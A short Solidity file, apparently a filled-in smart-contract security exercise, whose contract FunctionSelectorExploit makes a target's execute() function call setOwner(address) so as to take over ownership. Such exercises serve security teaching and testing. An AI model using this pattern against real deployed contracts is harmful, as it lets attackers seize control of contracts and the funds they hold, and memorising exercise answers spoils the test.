// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IFunctionSelector {
    function execute(bytes4 func) external;
}

contract FunctionSelectorExploit {
    IFunctionSelector public target;

    constructor(address _target) {
        target = IFunctionSelector(_target);
    }

    function pwn() external {
        // write your code here
        target.execute(bytes4(keccak256("setOwner(address)")));
    }
}